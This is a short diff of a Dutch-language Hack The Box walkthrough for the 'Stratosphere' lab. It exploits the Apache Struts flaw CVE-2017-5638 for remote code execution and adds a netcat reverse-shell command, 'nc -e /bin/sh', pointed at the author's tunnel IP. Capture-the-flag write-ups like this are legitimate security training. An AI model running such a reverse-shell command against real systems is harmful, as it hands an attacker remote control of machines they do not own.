@@ -34,3 +34,5 @@ Ik lees Struts, dus weet ik genoeg.
 Dit is een Python script dat CVE-2017-5638 probeert te exploiteren.
 
 <img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/4.PNG" />
+
+Hoppa, remote code execution! Het is nu de bedoeling dat ik een shell krijg, en dat is niet zo moeilijk. In plaats van ```echo "Gio" ``` als commando te gebruiken gebruik ik een commando waarmee ik dus een shell kan krijgen. De commando die ik meestal gebruik is: ```nc -e /bin/sh [Mijn tunnel ip] 1234 ```
